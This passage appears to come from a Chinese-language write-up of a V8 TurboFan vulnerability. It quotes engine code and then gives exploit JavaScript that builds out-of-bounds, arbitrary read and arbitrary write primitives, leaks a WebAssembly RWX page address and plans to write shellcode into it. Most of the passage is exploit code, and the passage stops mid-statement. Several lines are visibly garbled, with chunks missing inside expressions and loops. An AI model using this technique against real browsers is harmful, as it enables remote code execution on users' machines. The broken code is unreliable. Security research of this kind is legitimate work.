            edge.UpdateTo(dead_);
            Revisit(user);
          } else {
            DCHECK_NOT_NULL(control);
            edge.UpdateTo(control);
            Revisit(user);
          }
        } else if (NodeProperties::IsEffectEdge(edge)) {
          DCHECK_NOT_NULL(effect);
          edge.UpdateTo(effect); // [3]
          Revisit(user);
        } else {
          DCHECK_NOT_NULL(value);
          edge.UpdateTo(value);  // [4]
          Revisit(user);
        }
      }
    }
    void UpdateTo(Node* new_to) {
        Node* old_to = *input_ptr_;
        if (old_to != new_to) {
          if (old_to) old_to->RemoveUse(use_);
          *input_ptr_ = new_to;
          if (new_to) new_to->AppendUse(use_);
        }
      }
      ...
      void Node::RemoveUse(Use* use) {
      DCHECK(first_use_ == nullptr || first_use_->prev == nullptr);
      if (use->prev) {
        DCHECK_NE(first_use_, use);
        use->prev->next = use->next; // 将use移走
      } else {
        DCHECK_EQ(first_use_, use);
        first_use_ = use->next;
      }
      if (use->next) {
        use->next->prev = use->prev;
      }
    }
[2] 处是遍历节点的use边，此时节点为MaybeGrowFastElements，use边为"MaybeGrowFastElements  Node::RemoveUse
的链表操作将节点移走，替换成传进的参数value（即LoadField[+8] 节点）。
效果如下：
    value                      value
    LoadField[+8] wasm_shared_info->wasm_data->wasm_rwx 构造任意读原语一步步读取。
（4）利用任意写原语将shellcode 写入 rwx区域，即可完成利用。
编写该利用存在的坑：由于越界数组为浮点型，每次读写都是8个字节，而由于v8指针压缩的缘故，字段都被保存为4个字节，所以读写的字段可能位于高4个字节或低4个字节，就需要根据读出的内容进行分情况判断。
exp 代码：
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    var Uint32 = new Uint32Array(buf);
    var arraybuf = new ArrayBuffer(0x12333);
    function f2i(f)
    {
        float64[0] = f;
        return BigInt(Uint32[0]) + (BigInt(Uint32[1]) > 32n) == 0x12333n*/){
                backing_store_idx = j + 1;
                console.log("[+] find backing_store : 0x" + hex(f2i(oob_array[backing_store_idx])));
                if(((f2i(oob_array[j+1])) & 0xfffn) == 0x0n){
                    find = 1;
                    break;
                }
            }
            else if(((f2i(oob_array[j])) >> 32n) == 0x12333n){
                backing_store_idx = j;
            }
        }
        if(find == 1) break;
    }
    var data_view = new DataView(arraybuf);
    function dataview_read64(addr)
    {
        oob_array[backing_store_idx] = i2f(addr);
        return f2i(data_view.getFloat64(0, true));
    }
    //----- arbitrary write
    function dataview_write(addr, payload)
    {
        oob_array[backing_store_idx] = i2f(addr);
        for(let i=0; i > 32n;
                console.log("[+] leak wasm_func_addr : 0x" + hex(f2i(oob_array[j])));
                console.log("[+] find wasm_func_addr : 0x" + hex(wasmfunc_addr));
                find = 1;
                break;
            }
        }
        if(find == 1) break;
    }
    var wasm_rwx_idx = Number((wasmfunc_addr -1n +0x68n)/8n);
    console.log("[+] find wasm_rwx_idx: 0x" + hex(wasm_rwx_idx*8));
    var wasm_rwx_addr_low = (f2i(oob_array[wasm_rwx_idx-1])) >> 32n;
    console.log("[+] find wasm_rwx_addr_low : 0x" + hex(wasm_rwx_addr_low));
    if((wasm_rwx_addr_low & 0xfffn) != 0x000n){
        var wasm_rwx_addr = (f2i(oob_array[wasm_rwx_idx-1]));
        console.log("[+] find wasm_rwx_addr: 0x" + hex(wasm_rwx_addr));
    }else{
        var wasm_rwx_addr_high = ((f2i(oob_array[wasm_rwx_idx])) & 0xffffffffn) 